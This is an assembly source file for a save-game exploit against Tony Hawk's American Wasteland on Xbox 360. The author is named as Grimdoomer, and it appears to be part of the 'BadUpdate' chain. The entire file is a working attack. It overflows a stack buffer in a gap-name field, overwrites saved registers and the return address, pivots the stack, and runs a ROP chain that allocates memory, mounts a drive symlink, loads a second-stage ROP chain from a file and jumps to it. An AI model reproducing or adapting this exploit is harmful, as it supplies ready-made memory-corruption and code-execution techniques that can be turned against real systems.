# Description: Save game exploit for Tony Hawk's American Wasteland for Xbox 360 (NTSC)
# Author: Grimdoomer


# Compiler flags, must be set before any code or include directives:
.include "BuildConfig.asm"

# Include the header for the data segment file.
.include "BadUpdateExploit_Data_h.asm"

# Include additional files:
.include "Gadgets.asm"

.set ExploitDataSegmentAddress,             GapDataStartHeapAddress + (_data_segment_start - _gap_data_start)
.set ExploitDataSegmentSize,                _data_segment_end - _data_segment_start

.set gap_data_base_addr_ptr,                GapDataStartHeapAddress + (_gap_data_base_address_ptr - _gap_data_start)

#---------------------------------------------------------
# Gap name stack overflow
#---------------------------------------------------------
.long       GapDataStartFileOffset
.long       (_gap_data_end - _gap_data_start)

_gap_data_start:

        # +0 Start of gap 1 struct.
        .byte   0x08, 0x08, 0x1F, 0x1D
        .byte   0x00, 0x00, 0x31, 0x00

        # +8 Fill the gap name buffer with crap data.
        .byte   "Grim R0x T0ny H4wk's S0x!"
_1:     .fill   70 - (_1 - _gap_data_start) - 2, 1, 0x69

        # +78 new register values for function prolog
        .long   0x23232323, 0x23232323  # r23
        .long   0x24242424, 0x24242424  # r24
        .long   0x25252525, 0x25252525  # r25
        .long   0x26262626, 0x26262626  # r26
        .long   0x27272727, 0x27272727  # r27
        .long   0x28282828, 0x28282828  # r28
        .long   0x29292929, 0x29292929  # r29
        .long   0x30303030, 0x30303030  # r30
        .long   0x31313131, 0x31313131  # r31
        .long   stack_pivot             # lr
        .long   0xffffffff              #
        .long   GapDataStartHeapAddress + (stack_data - _gap_data_start) + 8    # Target stack pivot address
        
        # null terminator
        .byte   0
        #.align  4
1:      .fill   0x10 - ((GapDataStartHeapAddress + (1b - _gap_data_start)) % 0x10), 1, 0x00
        
stack_data:
        ###########################################################
        # Gadget 0: stack pivot
        #
        # lwz       r1, 0(r1)           # Perform the stack pivot (r1 = stack_data + 8)
        # lwz       r12, -8(r1)         # Load next gadget address
        # mtlr      r12
        # blr
        ###########################################################
        .long   __restgprlr_31          # r12 - address of the next ROP gadget
        .long   0x00000000
        
        ###########################################################
        # Gadget N: copy exploit data into .binkdata segment for easier access
        #
        #   r3 = dst address = address of .binkdata segment
        #   r4 = src address = address of data segment data in park file buffer
        #   r5 = size to copy = size of data segment data
        ###########################################################
        CALL_FUNC 11, memcpy, R3H=0, R3L=RuntimeDataSegmentAddress, R4H=0, R4L=ExploitDataSegmentAddress, R5H=0, R5L=ExploitDataSegmentSize
        
        ###########################################################
        # Gadget N: allocate virtual memory for second stage ROP chain data
        #
        #   r3 = pointer to allocation address (NULL)
        #   r4 = pointer to size variable (64kb allocation size)
        #   r5 = allocation type = MEM_COMMIT
        #   r6 = page protection = PAGE_READWRITE
        #   r7 = memory region type
        ###########################################################
        CALL_FUNC 11, NtAllocateVirtualMemory, R3H=0, R3L=second_stage_chain_address, R4H=0, R4L=second_stage_chain_size, R5H=0, R5L=0x00001000, R6H=0, R6L=0x00000004, R7H=0, R7L=0
        
        ###########################################################
        # Gadget N: mount the payload folder so we can read the second stage ROP chain file
        #
        ###########################################################
        CREATE_SYMLINK hdd_symlink_mount, hdd_symlink_path
        
        ###########################################################
        # Gadget N: read the secondary ROP chain file into memory
        #
        ###########################################################
    _rf_offset = (1f - _gap_data_start)
1:      READ_FILE secondary_payload_file_path, second_stage_chain_address, gap_data_base_addr_ptr, _rf_offset
        
        ###########################################################
        # Gadget N: offset the second stage ROP chain address to compensate for the stack pivot gadget used
        #
        ###########################################################
        LOAD_ADD_STORE second_stage_chain_address, 8 + second_stage_offset
        
        ###########################################################
        # Gadget N: write new stack pointer address into stack pivot gadget data
        #
        ###########################################################
        WRITE_PTR_TO_GADGET_DATA read_file_scratch, gap_data_base_addr_ptr, 1f - _gap_data_start, second_stage_chain_address
        .fill   0x50, 1, 0x00
        .long   0x31313131, 0x31313131              # r31
        .long   stack_pivot                         # lr
        .long   0x00000000
        
        ###########################################################
        # Gadget N: pivot to second stage ROP chain
        #
        #   lwz     r1, 0(r1)
        #   -lwz    r12, -8(r1)
        #   -mtlr   r12
        #   -blr
        ###########################################################
1:      .long   0x41414141              # new stack pointer address, written by previous gadgets


        # Pad the data to the next 4 byte boundary.
        .long   0x00000000

_buffer_overflow_end:

_gap_data_base_address_ptr:
        .long   GapDataStartHeapAddress

#---------------------------------------------------------
# Temporary data we copy to the .binkdata section
#---------------------------------------------------------

.include "BadUpdateExploit_Data.asm"

# Secret symbol table:
.long   0x69696969
.long   second_stage_chain_address

_gap_data_end:

#---------------------------------------------------------
# End of file
#---------------------------------------------------------
.long 0xffffffff
